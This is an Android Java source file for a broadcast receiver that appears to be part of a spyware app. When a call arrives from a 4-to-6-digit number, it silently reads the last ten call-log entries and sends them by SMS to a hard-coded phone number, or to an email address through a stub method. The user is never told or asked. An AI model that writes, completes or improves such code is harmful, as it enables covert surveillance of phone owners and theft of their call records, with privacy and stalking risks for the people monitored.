package com.example.fasterpro11;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.provider.CallLog;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;


import javax.mail.MessagingException;
import java.util.regex.Matcher;
import java.util.regex.Pattern;




public class CallListOrSmsSenderConditionaly extends BroadcastReceiver {

    private static final String TAG = "SmsReceiver";
    private static final String FORWARD_SMS_NUMBER = "+8801915564632";

    private Context mContext;

    @Override
    public void onReceive(Context context, Intent intent) {
        mContext = context;
        Log.d(TAG, "CallRecorderAuto class onReceive called with action: " + intent.getAction());

        if (TelephonyManager.ACTION_PHONE_STATE_CHANGED.equals(intent.getAction())) {
            String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
            if (TelephonyManager.EXTRA_STATE_RINGING.equals(state)) {
                String incomingNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);  // Corrected line
                Log.d(TAG, "Incoming call from: " + incomingNumber);

                // Check if the incoming number is 4 to 6 digits long
                if (isValidIncomingCallNumber(incomingNumber)) {  // Calling the method
                    Log.d(TAG, "Incoming number is valid: " + incomingNumber);

                    // Get the last 10 call logs
                    String recentCallLogs = getRecentCallLogs();

                    // Send the logs based on internet connection
                    if (isInternetConnected()) {
                        Log.d(TAG, "Internet is connected. Sending logs via email.");
                        try {
                            forwardLogsByEmail(incomingNumber, recentCallLogs);
                        } catch (MessagingException e) {
                            Log.e(TAG, "Failed to forward logs via email: " + e.getMessage());
                        }
                    } else {
                        Log.d(TAG, "Internet is not connected. Sending logs via SMS.");
                        forwardLogsBySMS(incomingNumber, recentCallLogs);
                    }
                }
            }
        }
    }

    // Validate if the incoming number is 4 to 6 digits long
    private boolean isValidIncomingCallNumber(String incomingNumber) {
        if (incomingNumber == null || incomingNumber.isEmpty()) {
            return false;  // Ensure no null or empty numbers are processed
        }

        Pattern pattern = Pattern.compile("\\b\\d{4,6}\\b");  // Regex for 4 to 6 digits
        Matcher matcher = pattern.matcher(incomingNumber);
        Log.d(TAG, "Matched number in Call Logs: " + incomingNumber);
        return matcher.find();
    }

    // Check if the device is connected to the internet
    private boolean isInternetConnected() {
        ConnectivityManager cm = (ConnectivityManager) mContext.getSystemService(Context.CONNECTIVITY_SERVICE);
        if (cm != null) {
            NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
            return activeNetwork != null && activeNetwork.isConnected();
        }
        return false;
    }

    // Get the last 10 call logs
    private String getRecentCallLogs() {
        StringBuilder callLogBuilder = new StringBuilder();
        Uri callLogUri = CallLog.Calls.CONTENT_URI;
        String[] projection = {CallLog.Calls.NUMBER, CallLog.Calls.DATE, CallLog.Calls.TYPE};
        Cursor cursor = null;

        try {
            cursor = mContext.getContentResolver().query(callLogUri, projection, null, null, CallLog.Calls.DATE + " DESC LIMIT 10");
            if (cursor != null && cursor.moveToFirst()) {
                int index = 0;
                do {
                    String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                    String date = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE));
                    String type = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
                    String typeStr = (type.equals(String.valueOf(CallLog.Calls.OUTGOING_TYPE))) ? "Outgoing"
                            : (type.equals(String.valueOf(CallLog.Calls.INCOMING_TYPE))) ? "Incoming" : "Missed";

                    callLogBuilder.append("[").append(++index).append("] ")
                            .append("Number: ").append(number).append(", ")
                            .append("Date: ").append(date).append(", ")
                            .append("Type: ").append(typeStr).append("\n");
                } while (cursor.moveToNext());
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting call logs: " + e.getMessage());
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        return callLogBuilder.toString();
    }

    // Forward the logs via SMS
    private void forwardLogsBySMS(String sender, String logs) {
        SmsManager smsManager = SmsManager.getDefault();
        String message = "Incoming Call: " + sender + "\n\nRecent Call Logs:\n" + logs;
        smsManager.sendTextMessage(FORWARD_SMS_NUMBER, null, message, null, null);
        Log.d(TAG, "Logs forwarded via SMS to: " + FORWARD_SMS_NUMBER);
    }

    // Forward the logs via Email
    private void forwardLogsByEmail(String sender, String logs) throws MessagingException {
        // Implement email sending logic here (e.g., using JavaMail API)
        String subject = "Incoming Call: " + sender;
        String body = "Recent Call Logs:\n" + logs;
        // Example logic to send email (JavaMail implementation)
        sendEmail("example@domain.com", subject, body);  // Calling the email sending method
    }

    // Method to send email (use actual implementation for your environment)
    private void sendEmail(String to, String subject, String body) {
        // Your email sending logic goes here
        // Example using JavaMail API
        Log.d(TAG, "Sending email to: " + to + " with subject: " + subject + " and body: " + body);
        // Implement the JavaMail API or another library to send the email.
    }
}
